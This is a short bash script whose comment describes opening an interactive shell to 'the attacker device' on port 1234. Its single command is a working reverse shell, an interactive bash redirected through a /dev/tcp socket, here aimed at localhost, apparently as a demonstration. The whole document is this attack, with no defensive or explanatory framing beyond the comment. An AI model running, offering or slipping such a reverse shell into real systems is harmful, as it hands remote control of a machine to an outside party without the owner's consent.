#!/bin/bash

# Opens a interactive BASH connecting to the attacker device in port 1234  by creatting a TCP socket
bash -i >& /dev/tcp/localhost/1234 0>&1
